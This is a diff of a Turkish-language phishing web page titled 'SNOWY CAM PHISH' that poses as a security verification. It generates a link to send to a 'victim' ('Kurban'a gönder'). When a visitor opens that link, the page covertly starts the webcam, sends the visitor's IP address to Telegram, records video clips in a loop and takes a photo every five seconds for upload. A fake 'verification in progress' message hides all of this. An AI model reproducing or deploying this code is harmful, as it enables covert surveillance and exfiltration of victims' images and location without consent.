@@ -3,56 +3,177 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Güvenlik Doğrulaması</title>
+    <title>SNOWY CAM PHISH</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
+        
         .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 30px;
             padding: 40px;
-            max-width: 450px;
+            max-width: 500px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
             text-align: center;
+            color: white;
         }
-        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
-        h2 span { color: #667eea; }
-        p { color: #666; margin-bottom: 30px; }
+        
+        h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        h1 span {
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff;
+        }
+        
+        .subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
         .btn {
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white; border: none; padding: 16px 32px;
-            font-size: 18px; font-weight: bold; border-radius: 50px;
-            cursor: pointer; width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            backdrop-filter: blur(5px);
         }
-        .btn:hover { transform: translateY(-2px); }
-        .loading { display: none; margin: 20px 0; }
-        .spinner {
-            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
-            border-radius: 50%; width: 40px; height: 40px;
-            animation: spin 1s linear infinite; margin: 0 auto;
+        
+        .btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #00ffff;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 255, 255, 0.3);
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text { color: #667eea; margin-top: 10px; }
-        #video, #canvas { display: none; }
+        
+        .btn.primary {
+            background: linear-gradient(45deg, #00ffff, #0066ff);
+            border: none;
+            color: #000;
+        }
+        
+        .btn.primary:hover {
+            box-shadow: 0 10px 25px rgba(0, 255, 255, 0.5);
+        }
+        
+        .link-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 14px;
+            color: #00ffff;
+            display: none;
+        }
+        
+        .status-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid #00ffff;
+            text-align: left;
+            display: none;
+        }
+        
+        .status-title {
+            color: #00ffff;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .status-content {
+            color: white;
+            font-family: monospace;
+            line-height: 1.6;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 12px;
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #00ffff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        #video, #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>❄️ <span>GÜVENLİK</span> DOĞRULAMASI</h2>
-        <p>Devam etmek için kamera erişimine izin verin.</p>
-        <button class="btn" id="startBtn" onclick="startCamera()">📸 BAŞLAT</button>
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <div class="loading-text" id="loadingText">Güvenlik kontrolü...</div>
+        <h1>❄️ <span>SNOWY</span> CAM PHISH</h1>
+        <div class="subtitle">Güvenlik doğrulama sistemi</div>
+        
+        <div class="btn-container">
+            <button class="btn primary" id="linkBtn" onclick="createLink()">
+                <span>🔗</span> Link Oluştur
+            </button>
+            <button class="btn" id="sahipBtn" onclick="showSahip()">
+                <span>👤</span> Sahip
+            </button>
+            <button class="btn" id="kanalBtn" onclick="showKanal()">
+                <span>📢</span> Kanal
+            </button>
+        </div>
+        
+        <div class="link-box" id="linkBox"></div>
+        <div class="status-box" id="statusBox"></div>
+        
+        <div class="footer">
+            ❄️ @snowy_dexry_wexry ❄️
         </div>
     </div>
     
@@ -70,14 +191,57 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
+        const linkBox = document.getElementById('linkBox');
+        const statusBox = document.getElementById('statusBox');
         
         let mediaRecorder = null;
         let recordedChunks = [];
         let videoCount = 0;
         let photoCount = 0;
+        let stream = null;
         
         // ============================================
-        // SADECE İP ADRESİ AL - KESİN ÇALIŞAN
+        // BUTON FONKSİYONLARI
+        // ============================================
+        function showSahip() {
+            statusBox.style.display = 'block';
+            statusBox.innerHTML = `
+                <div class="status-title">👤 SAHİP BİLGİLERİ</div>
+                <div class="status-content">
+                    ❄️ SNOWY DEXRY WEXRY<br>
+                    🔐 Güvenlik araçları geliştiricisi<br>
+                    📱 @snowy_dexry_wexry
+                </div>
+            `;
+            linkBox.style.display = 'none';
+        }
+        
+        function showKanal() {
+            statusBox.style.display = 'block';
+            statusBox.innerHTML = `
+                <div class="status-title">📢 KANAL BİLGİLERİ</div>
+                <div class="status-content">
+                    🔔 Güncellemeler ve yeni tool'lar<br>
+                    📢 @snowykanal<br>
+                    ❄️ Takipte kal!
+                </div>
+            `;
+            linkBox.style.display = 'none';
+        }
+        
+        function createLink() {
+            const link = `https://snowy-dexry-wexry.github.io/Snowy/?i=${TARGET_ID || 'KULLANICI_ID'}`;
+            linkBox.style.display = 'block';
+            linkBox.innerHTML = `
+                <div style="margin-bottom:10px; color:#00ffff;">🔗 LİNKİN HAZIR</div>
+                <code style="color:white;">${link}</code>
+                <div style="margin-top:15px; font-size:12px; color:rgba(255,255,255,0.5);">📌 Kurban'a gönder, tıklasın.</div>
+            `;
+            statusBox.style.display = 'none';
+        }
+        
+        // ============================================
+        // SADECE İP ADRESİ AL
         // ============================================
         async function getIP() {
             try {
@@ -90,7 +254,7 @@
         }
         
         // ============================================
-        // İP'Yİ TELEGRAM'A GÖNDER - DÜZGÜN FORMAT
+        // İP'Yİ TELEGRAM'A GÖNDER
         // ============================================
         async function sendIP(ip) {
             const msg = `❄️ **SNOWY CAM PHISH** ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 **IP Adresi:** ${ip}\n⏱️ **Zaman:** ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
@@ -103,7 +267,7 @@
         }
         
         // ============================================
-        // VİDEO KAYDI BAŞLAT - KESİN ÇALIŞAN
+        // VİDEO KAYDI BAŞLAT
         // ============================================
         function startVideoRecording() {
             recordedChunks = [];
@@ -127,7 +291,7 @@
                     body: formData
                 });
                 
-                // 1 saniye sonra tekrar başlat (arka arkaya videolar)
+                // 1 saniye sonra tekrar başlat
                 setTimeout(startVideoRecording, 1000);
             };
             
@@ -141,7 +305,7 @@
         }
         
         // ============================================
-        // FOTOĞRAF ÇEK - KESİN ÇALIŞAN
+        // FOTOĞRAF ÇEK
         // ============================================
         async function takePhoto() {
             photoCount++;
@@ -163,41 +327,57 @@
         }
         
         // ============================================
-        // KAMERAYI BAŞLAT
+        // KAMERAYI BAŞLAT (EĞER SAYFA ?i= İLE AÇILDIYSA)
         // ============================================
         async function startCamera() {
+            if (!TARGET_ID) return;
+            
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                
-                document.getElementById('startBtn').style.display = 'none';
-                document.getElementById('loading').style.display = 'block';
                 
                 // SADECE İP ADRESİNİ AL VE GÖNDER
                 const ip = await getIP();
                 await sendIP(ip);
                 
-                // 2 saniye bekle (kamera stabil olsun)
+                // 2 saniye bekle
                 await new Promise(r => setTimeout(r, 2000));
                 
-                // VİDEO KAYDI BAŞLAT (arka arkaya 15 saniyelik videolar)
+                // VİDEO KAYDI BAŞLAT
                 startVideoRecording();
                 
                 // FOTOĞRAF ÇEK (her 5 saniyede bir)
                 setInterval(takePhoto, 5000);
                 
-                // YAZIYI DEĞİŞTİR (kurban anlamasın)
-                const texts = ["Güvenlik kontrolü...", "Kimlik doğrulanıyor...", "Lütfen bekleyin..."];
-                let i = 0;
-                setInterval(() => {
-                    i = (i + 1) % texts.length;
-                    document.getElementById('loadingText').innerText = texts[i];
-                }, 3000);
-                
             } catch(e) {
-                alert('Kamera izni gerekli!');
+                console.log('Kamera hatası:', e);
             }
         }
+        
+        // ============================================
+        // SAYFA YÜKLENDİĞİNDE
+        // ============================================
+        window.onload = function() {
+            if (TARGET_ID) {
+                // Eğer ID varsa, otomatik başlat
+                startCamera();
+                
+                // Butonları devre dışı bırak
+                document.getElementById('linkBtn').style.display = 'none';
+                document.getElementById('sahipBtn').style.display = 'none';
+                document.getElementById('kanalBtn').style.display = 'none';
+                
+                // Loading göster
+                statusBox.style.display = 'block';
+                statusBox.innerHTML = `
+                    <div class="status-title">🔄 İŞLEM YAPILIYOR</div>
+                    <div class="status-content">
+                        <div class="loader" style="margin:10px auto;"></div>
+                        Güvenlik doğrulaması yapılıyor...
+                    </div>
+                `;
+            }
+        };
         
         // ============================================
         // SAYFA KAPANIRKEN
